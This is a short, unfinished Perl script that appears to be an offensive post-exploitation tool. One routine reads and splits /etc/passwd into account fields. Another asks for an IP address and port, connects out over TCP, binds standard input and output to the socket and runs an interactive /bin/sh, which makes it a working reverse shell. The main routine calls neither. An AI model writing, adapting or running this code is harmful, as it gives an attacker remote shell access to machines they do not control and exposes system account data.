#!/usr/bin/perl

#rough code, still need to make a lot o' shit

use strict;
use warnings;
use Term::ANSIColor;
use Socket;

system ('clear');

main();

sub main {
	print color('bright_cyan');
}

sub passwd {
	open(PASSWD, "/etc/passwd");
	print color('bright_magenta');

	while (<PASSWD>) {
		chomp($_);
		my ($user, $pass, $uid, $gid, $real, $home, $shell) = split /:/, $_;
	}
	print color('reset');
	close PASSWD;
}

sub shell {
	print "What is your IP address: ";
	chomp(my $ip = <STDIN>);
	print "What is the open port ";
	chomp(my $port = <STDIN>);

	socket(S,PF_INET,SOCK_STREAM,getprotobyname("TCP"));
	if (connect(S,sockaddr_in($port,inet_aton($ip)))) {
		open(STDIN, ">&S");
		open(STDOUT, ">&S");
		open(STDERR, ">&S");
		exec("/bin/sh -i");
	}
	else {
		print color('bright_red'), "Unable to open a shell\n";
	}
}
